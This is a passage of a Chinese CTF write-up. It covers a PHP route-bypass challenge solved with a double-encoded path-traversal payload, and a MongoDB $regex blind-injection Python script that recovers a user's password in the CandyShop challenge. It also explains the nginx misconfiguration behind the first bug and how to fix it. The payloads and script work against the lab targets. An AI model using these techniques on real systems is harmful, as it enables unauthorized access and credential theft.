        <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">global</span> <span class="token variable">$app</span><span class="token punctuation">;</span>
    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"./"</span><span class="token punctuation">.</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"body_content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"template"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">"POST /login"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">global</span> <span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$app</span><span class="token punctuation">;</span>
    <span class="token variable">$request</span>  <span class="token operator">=</span> <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token variable">$username</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/login?fail=1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>有一个过滤，对所有输入进行了检察，不允许目录穿越。然后是一个匹配全部路径的路由，如果请求的url中没有login，且用户没有登录，就直接重定向到login路由。login路由要成功登录的话必须输入的用户名和密码与其预设的密码强相等，用户名密码是硬编码的，所以这里已经不可能成功登录了<br>admin路由处接受一个GET的data参数，拼一个<code>./</code>后进行模板渲染<br>看一眼模板，这句有用</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$data</span> <span class="token punctuation">.</span> <span class="token string">":"</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bg-light border rounded-3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">white-space</span><span class="token punctuation">:</span> pre-line</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
</code></pre>
<p>直接file_get_contents<br>那么目标很明确，想办法访问到admin路由，然后传入一个data读根目录flag</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>先直接给出payload<br><code>/aa/admin%3flogin&amp;data=..%252f..%252f..%252f..%252fflag</code><br>乍一看好像很简单，就二次编码就过去了，所以乱按就有可能做出来<br>但说实话，这里不乱按可能想正常做出来还挺麻烦的</p>
<p>先来看一下这个框架是如何解析路由的，看到router.php</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">route</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$url_decoded</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$route</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$route</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$route</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">matchMethod</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$route</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">matchUrl</span><span class="token punctuation">(</span><span class="token variable">$url_decoded</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">case_sensitive</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token variable">$route</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p><code>$requst-&gt;url</code>来自这段代码</p>
<pre class=" language-php"><code class="language-php">Request<span class="token punctuation">.</span>php
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token string">'url'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'%40'</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getVar</span><span class="token punctuation">(</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token string">'base'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'%20'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getVar</span><span class="token punctuation">(</span><span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token string">'query'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Collection</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base</span> <span class="token operator">!=</span> <span class="token string">'/'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">// Default url</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true">// Merge URL query parameters with $_GET</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$_GET</span> <span class="token operator">+</span><span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">parseQuery</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre>
<p>过程就是把REQUEST_URI按照SCRIPT_NAME把前面半边截掉，把剩下的部分作为url<br>再看一下matchUrl这个函数</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>花里胡哨的这里没有用的代码
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'#^'</span><span class="token punctuation">.</span><span class="token variable">$regex</span><span class="token punctuation">.</span><span class="token string">'(?:\?.*)?$#'</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$case_sensitive</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token punctuation">:</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ids</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">regex</span> <span class="token operator">=</span> <span class="token variable">$regex</span><span class="token punctuation">;</span>

            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre>
<p>这里的$regex就是我们的路由，$url就是之前的url，这个正则虽然抽象了一点，但是试一下还是能发现其能够让<code>/admin?xxx</code>这种形式的输入匹配上<code>/admin</code>这个路由，在route这个函数的开始，他对我们输入的url进行了一次urldecode，所以我们如果访问的是<code>/admin%3flogin</code>这样的路径，在这里就会变成<code>/admin?login</code>这样的字符，且能被正确匹配到<code>/admin</code>路由上<del>但其实有没有这个urldecode都一样</del><br>加上之前url初始化的时候用base截去了最后一个<code>/</code>前的所有内容，确保了我们使用<code>/aa/admin%3flogin</code>这样的路由访问能绕过nginx对<code>/admin</code>开头的匹配，又能让PHP正确匹配上路由</p>
<blockquote>
<p>Q:为什么不能直接访问<code>/aa/admin?login</code><br>A:因为nginx.conf中有一项<code>fastcgi_param  REQUEST_URI  $uri;</code>，作用为在向fastcgi传递一个REQUEST_URI参数，而该参数是被nginx解析过的<code>$uri</code>变量，该变量仅包括路径，<strong>不包括query_string</strong>。而url来自REQUEST_URI，就是这个nginx的$uri变量，不包含query_string，这样子后端收到的内容就是<code>/aa/admin</code>，并没有login字符，而根据index.php中的逻辑，没有login的话会被框架重定向到<code>/login</code>下</p>
</blockquote>
<p>接下来只需要提交一个数据到admin路由下就行了，代码中是将输入拼了一个<code>./</code>再读的，而全局过滤又禁用了<code>../</code>目录穿越，而这里我们用了一个二次编码就绕过了</p>
<p>看到query参数的解析，首先是直接把全部的$_GET赋值过来，这很合理<br>然后还有一步额外的解析</p>
<pre class=" language-php"><code class="language-php">        <span class="token comment" spellcheck="true">// Default url</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true">// Merge URL query parameters with $_GET</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$_GET</span> <span class="token operator">+</span><span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">parseQuery</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">parseQuery</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>这里先调用了一个parse_url，然后就补了一个parse_str，而parse_str在进行解析的时候会进行一次urldecode。成了</p>
<p>但是这里似乎还是有哪里不太对，因为URL是收的nginx转发过来的REQUEST_URI，我们如果使用<code>%3f</code>去让nginx认为<code>/aa/admin%3flogin</code>是一个完整的url，那么nginx在和fpm通信时，理论上是不会解码这个数据的，那么后端收到的url也应该是<code>/aa/admin%3flogin</code>，而在route的时候因为进行了url解码，所以能正确解析，但参数解析时并不会进行url解码，那么<code>%3f</code>后面的内容也就不会被parse_url放到<code>$args[&#39;query&#39;]</code>中去，也就不会经历第二次解码才对</p>
<blockquote>
<p>Q:为什么要二次编码，如果nginx转发时不解码的话不是一次编码就行？<br>A:因为nginx他真的解码了一次，不然这里也没法继续做了，应该是出题人故意写了个不是那么正确的配置导致的这个问题</p>
</blockquote>
<p>我修改了nginx和fastcgi的通信目的地，靠nc抓了一份通信流量下来，该流量中REQUEST_URI出现了两遍，后面一遍应当是在nginx.conf中配置发送的变量，且后端以后面的变量作为输入</p>
<pre><code>SCRIPT_NAME/aa/aa/admin?login&amp;data=..%2f..%2f..%2f..%2fflag
REQUEST_URI/aa/aa/admin%3flogin&amp;data=..%252f..%252f..%252f..%252fflag
REQUEST_URI/aa/aa/admin?login&amp;data=..%2f..%2f..%2f..%2fflag
</code></pre>
<p>我们发现，配置文件中通过<code>$uri</code>添加的REQUEST_URI被解码了一次，而这样就导致上面说的一切全部变得合理起来</p>
<blockquote>
<p>Q:就算这样，一次编码过来直接解码了，这个数据也不在$_GET里面，不会被waf检测，为什么不能直接一次编码呢<br>A:因为这样子一次解码过来虽然直接解码了，但是出现了<code>/</code>，会被认为是一个路径，就要过路由选择，这样子就会被当成路由不带login然后被重定向掉</p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我自己都快被绕晕了<br>这题的漏洞点在于，各种额外的urldecode。nginx的错误配置导致输入的uri被解码一次，这样子就能用%3f让nginx认为后面的内容不是query string，而nginx在发给后端时又解了一次码，在后端进行解析的时候因为解了一次码又成功的把变量解析进去了<br>路由绕过那个地方，因为nginx本身decode了一下，所以有没有urldecode都能绕过</p>
<p>正确的使用方法，我估计是把那行$uri去掉，或者改成$request_uri，这个是nginx和fpm通信的默认值，这个值是携带query_string但不会进行解码的，再把路由匹配前面的urldecode删掉，就无敌了</p>
<p>在修改$uri为$request_uri后，尝试如下payload<br><code>/aa/admin%3flogin?data=..%252f..%252f..%252f..%252fflag</code><br>这个显式的提交data，因为nginx不解码，所以在GET中解码一次也好，在parseQuery中解码一次也好，都只解码一次，不能用<br>若只编码一次，在GET中解码一次直接被waf拦截</p>
<p><code>/aa/admin%3flogin&amp;data=..%252f..%252f..%252f..%252fflag</code><br>将<code>?</code>改为<code>&amp;</code>，由于发到后端没有解码，%3f不能当问号使了直接啥都没解析出来</p>
<p>就修好了</p>
<h2 id="CandyShop"><a href="#CandyShop" class="headerlink" title="CandyShop"></a>CandyShop</h2><p>这个题比较简单，思路较为清晰，所以出的人也最多。。。呜呜</p>
<p>功能点不多，所以很好找入手点<br>user就登录注册两个功能，不过注册这里写死了一项，新注册的用户的active属性都是false，也就意味着新注册的用户都没法用</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">await</span> db<span class="token punctuation">.</span>Users<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
</code></pre>
<p>那就只能去登录他已有的用户了，数据库初始化的时候有这么一项</p>
<pre class=" language-javascript"><code class="language-javascript">users<span class="token punctuation">.</span><span class="token function">insertOne</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    username<span class="token punctuation">:</span> <span class="token string">'rabbit'</span><span class="token punctuation">,</span>
    password<span class="token punctuation">:</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    active<span class="token punctuation">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>不过这个密码超级随机数[a-z0-9]{64}，爆破是不可能的了，并且十分钟重置一次环境，神仙来了都爆不出来<br>看看登录的地方，因为用的是MongoDB，这种nosql数据库和普通SQL区别比较大，一般来说不会有什么注入的地方，除非用了where语句</p>
<pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
    <span class="token keyword">let</span> rec <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span>Users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">{</span>username<span class="token punctuation">:</span> username<span class="token punctuation">,</span> password<span class="token punctuation">:</span> password<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rec<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>rec<span class="token punctuation">.</span>username <span class="token operator">===</span> username <span class="token operator">&amp;&amp;</span> rec<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> rec<span class="token punctuation">,</span> <span class="token punctuation">{</span>signed<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
            res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/shop'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>error<span class="token punctuation">:</span> <span class="token string">'You Bad Bad >_&lt;'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>error<span class="token punctuation">:</span> <span class="token string">'Login Failed!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>这里其实非常可疑，之前在注册时对输入的用户名进行了类型校验，而这里没有，且当我输入用户名密码登录成功后，还检查了一遍这个用户的用户名密码和我输入的用户名密码是否一致。理论上如果我是输入用户名密码登录进来的那这里绝对是一致的，那这里就必然是在防一手注入，也就意味着有我不懂的nosql注入存在</p>
<p>搜了一下发现是在查询时通过数组的方式去添加条件项进行查询，比如<code>&#123;&quot;password&quot;:&#123;&quot;$ne&quot;: 1&#125;&#125;</code>这样一句，就是寻找一个password不是1的记录，而这样的查询可以通过password[$ne]&#x3D;1来提交，这样子就能万能密码登录，但这里防了一手万能密码，不过翻文章看到存在一个条件项为$regex，支持正则表达式。盲注搞定<br>写一个垃圾脚本</p>
<pre class=" language-python3"><code class="language-python3">import requests
import time

url = "http://123.60.21.23:23333/user/login"
password = ""
numset = "1234567890"
charset = "abcdef"
for i in range(64):
    data = {"username": "rabbit", "password[$regex]": "^{}.*".format(password + "[a-z]")}
    res = requests.post(url, data)
    if "You Bad Bad" in res.text:
        for c in charset:
            data = {"username": "rabbit", "password[$regex]": "^{}.*".format(password+c)}
            res = requests.post(url, data)
            time.sleep(0.2)
            if "You Bad Bad" in res.text:
                password += c
                print(password)
                break
    else:
        for n in numset:
            data = {"username": "rabbit", "password[$regex]": "^{}.*".format(password+n)}
            res = requests.post(url, data)
            time.sleep(0.2)
            if "You Bad Bad" in res.text:
                password += n
                print(password)
                break
</code></pre>
<p>稍微二分了一下注的快一点，不然十分钟重置一次光注入都要一两分钟。。。<br>登进来之后看能用的功能，就这一个能用，剩下的要么就没能输入的东西，要么就输入的东西不可控</p>
<pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/order'</span><span class="token punctuation">,</span> checkLogin<span class="token punctuation">,</span> checkActive<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> candyname<span class="token punctuation">,</span> address<span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
    <span class="token keyword">let</span> tpl_path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'../views/confirm.pug'</span><span class="token punctuation">)</span>
    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>tpl_path<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> result<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
